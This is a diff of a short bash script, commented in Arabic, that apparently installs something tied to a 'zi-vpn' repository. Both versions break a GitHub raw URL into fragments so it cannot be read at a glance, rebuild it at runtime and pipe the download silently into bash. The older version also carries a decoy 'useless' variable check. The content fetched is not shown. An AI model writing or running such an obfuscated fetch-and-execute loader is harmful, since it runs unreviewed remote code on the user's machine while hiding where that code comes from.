@@ -1,37 +1,19 @@
 #!/bin/bash
 
-# ألوان للتزيين
-YELLOW="\033[1;33m"
-GREEN="\033[0;32m"
-RED="\033[0;31m"
-NC="\033[0m"
-
-# الرابط الحقيقي مقطع
+# تقطيع الرابط
 p1="https:"
 p2="/"
-p3="/raw"
-p4="/githubusercontent.com"
-p5="/hq-mp"
-p6="/zi-vpn.com"
-p7="/refs"
-p8="/heads"
-p9="/main"
-p10="/in"
+p3="raw"
+p4="githubusercontent.com"
+p5="hq-mp"
+p6="zi-vpn.com"
+p7="refs"
+p8="heads"
+p9="main"
+p10="in"
 
-# تركيب الرابط
-build_url() {
-    echo "${p1}${p2}${p3}${p4}${p5}${p6}${p7}${p8}${p9}${p10}"
-}
+# تجميع الرابط
+url="${p1}${p2}${p2}${p3}${p2}${p4}${p2}${p5}${p2}${p6}${p2}${p7}${p2}${p8}${p2}${p9}${p2}${p10}"
 
-# تنفيذ الرابط
-run_remote_script() {
-    url=$(build_url)
-    curl -s "$url" | bash
-}
-
-
-unused="useless"
-[[ $unused == "important" ]] && echo "Running..." || true
-
-# كول الدالة الحقيقية
-run_remote_script
+# تنفيذ المحتوى
+curl -s "$url" | bash
